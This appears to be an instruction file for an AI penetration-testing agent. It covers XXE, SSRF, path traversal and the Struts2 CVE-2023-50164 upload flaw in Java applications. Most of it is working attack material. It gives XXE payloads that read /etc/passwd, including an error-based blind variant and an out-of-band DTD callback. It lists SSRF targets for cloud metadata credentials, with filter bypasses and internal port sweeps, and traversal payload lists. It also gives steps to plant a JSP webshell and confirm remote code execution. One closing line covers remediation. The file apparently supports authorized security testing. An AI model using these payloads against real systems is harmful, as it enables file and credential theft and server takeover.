# XXE, SSRF & path traversal (Java)

## XXE
Java XML parsers (`DocumentBuilderFactory`, SAX, `XMLStreamReader`, JAXB, dom4j)
are vulnerable when they accept user XML with external entities enabled. Find XML
sinks: `Content-Type: application/xml`/`text/xml`, SOAP, SAML, `.docx`/`.svg`
uploads, REST endpoints accepting XML.
- Send via `http_request` (`Content-Type: application/xml`):
  `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`.
  `root:.*:0:0:` in the response ⇒ XXE file read. Also read
  `file:///WEB-INF/web.xml`, `file:///c:/windows/win.ini`.
- **Blind/OOB**: external DTD `<!ENTITY % e SYSTEM "http://<oob>/x">%e;` — a
  callback on your listener confirms; this also drives SSRF.
- **Blind XXE without OOB (error-based)**: force the file content into a parser
  ERROR — no listener needed. Nest a parameter entity referencing a nonexistent
  path built from the file's own content, so the resulting
  `FileNotFoundException`/`MalformedURLException` echoes it:
  `<!DOCTYPE r [<!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
  %eval;%err;]><r>&x;</r>`. Read the stacktrace via `http_flow_body` — Java's
  Xerces/JAXP error text includes the failed (substituted) path.

## SSRF
A param/field holding a URL the server fetches (`url=`, `image=`, `callback=`,
`webhook=`, XML `SYSTEM`, SVG, Spring Cloud Gateway). `http_request` the input
pointing at:
- `http://127.0.0.1:8080/`, `http://localhost/`, internal hosts;
- **cloud metadata**: `http://169.254.169.254/latest/meta-data/` (AWS),
  `http://metadata.google.internal/computeMetadata/v1/` (GCP, header
  `Metadata-Flavor:Google`). Returned metadata/creds ⇒ SSRF.
- Filter bypasses: `http://0177.0.0.1`, `http://[::1]`, `http://2130706433/`,
  `@`-tricks, DNS rebinding.
- **Internal port scan (no OOB needed)**: sweep with ONE `http_fuzz`
  (`url:"http://127.0.0.1:FUZZ/"`, ports as payloads, batches <=500) and read
  `status`/`length`/`timeMs` — fast connection-refused vs. a hang/banner
  differential maps open internal ports without any listener.

## Path traversal / LFI (read)
Params like `?file=`, `?path=`, `?template=`, `?download=`, `?name=`. Sweep depths
in ONE `http_fuzz` (`match_regex:"root:.*:0:0:"`): `payloads:[
"../../../../etc/passwd","..%2f..%2f..%2fetc%2fpasswd","..%252f..%252fetc/passwd",
"../../../WEB-INF/web.xml","../../../WEB-INF/classes/application.properties",
"....//....//etc/passwd"]`. `WEB-INF/web.xml` and `application.properties` leak
routes, DB creds, and class names.

## Struts2 file-upload traversal → webshell (CVE-2023-50164)
A `.action` upload endpoint (`JSESSIONID`, `.action`) is most likely **this**, NOT
OGNL. Struts mishandles the upload's file-name parameter: by polluting it (the
parameter name is case-insensitive) with a relative path you write the uploaded
file OUTSIDE the temp dir — e.g. drop a `.jsp` webshell into a served directory,
then GET it for RCE. No OGNL needed.
1. Find the multipart upload (`browser_get_form_fields`; the field is often
   `upload`/`file`, with a sibling `uploadFileName`).
2. With `http_request` (`Content-Type: multipart/form-data; boundary=...`) send a
   part whose value is a JSP webshell and a polluted name param pointing up-and-out,
   e.g. `Upload`/`uploadFileName` = `../../webapps/ROOT/shell.jsp` (try a few
   depths and target dirs).
3. Confirm by GETting the written path (`http_request` `/shell.jsp?cmd=id`) and
   reading `uid=` in the body — that, not the page title, is the proof.

If a value is genuinely OGNL-evaluated you'll see it (e.g. `%{7*7}`→`49` reflected);
if not, stop forcing OGNL and pursue the upload traversal above.

Evidence: file contents (`/etc/passwd`, `web.xml`), metadata/creds, or OOB callback.
Remediation: disable DOCTYPE/external entities
(`setFeature("http://apache.org/xml/features/disallow-doctype-decl",true)`),
allowlist SSRF egress, and canonicalize + validate file paths within a base dir.
